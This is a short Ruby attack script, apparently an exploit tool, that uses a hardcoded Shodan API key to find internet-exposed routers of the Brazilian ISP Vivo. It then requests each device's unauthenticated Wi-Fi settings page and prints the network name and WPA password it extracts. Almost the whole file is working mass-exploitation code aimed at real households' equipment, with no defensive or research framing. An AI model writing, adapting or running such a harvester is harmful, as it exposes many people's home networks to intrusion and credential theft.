#!usr/bin/ruby
begin

require 'net/http'
require 'open-uri'
require 'uri'
require 'shodan'

rescue LoadError 
	puts "Gem install Shodan"
end

begin 
puts "\n"
puts"db    db d888888b db    db  .d88b.  d8b   db "
puts"88    88   `88'   88    88 .8P  88. 888o  88 "
puts"Y8    8P    88    Y8    8P 88  d'88 88V8o 88 "
puts"`8b  d8'    88    `8b  d8' 88 d' 88 88 V8o88 "
puts" `8bd8'    .88.    `8bd8'  `88  d8' 88  V888 "
puts"   YP    Y888888P    YP     `Y88P'  VP   V8P "
puts "\n"                                             
puts "Reescrito por>Habil "                           
puts "\n"


 api = Shodan::Shodan.new("ydlDFEesB6dmjdw3YBBaG4eCFN8gM7j0")
		result = api.search("org:'Vivo' /wizard ")
		result['matches'].each{ |host|
		host_ip =  host['ip_str']
		host_port = host['port']
		puts "\n"
uri = URI ("http://#{host_ip}:#{host_port}/index.cgi?page=wifi")
res = Net::HTTP::get_response(uri)
if res.code =~ /200/
	body = res.body
	puts "\n"
	level1 = body.sub(/&ssid=/, "[+] SSID: ", )
	level2 = level1.sub(/&WiFi_selectType=/, "")
	level3 = level2.sub(/wpa1wpa2&psk_wepkey=/, "[+] Password:")
	level4 = level3.sub(/&WiFi_selectChannel=-1/, "") 
	level5 = level4.sub(/&WiFi_selectChannel=9/, "") 
	level6 = level5.sub(/wpa2&psk_wepkey=/, "[+] Password:")
	level7 = level6.sub(/&WiFi_selectChannel=5/, "") 
	level8 = level7.sub(/&WiFi_selectChannel=1/, "") 
	level9 = level8.sub(/&WiFi_selectChannel=6/, "")
	level10 = level9.sub(/&WiFi_selectChannel=/, "")
		puts level10
		puts "\n"
else
puts "[+] Fail"  
end
}
rescue Interrupt => e
	puts "[+] Cancelado"
end
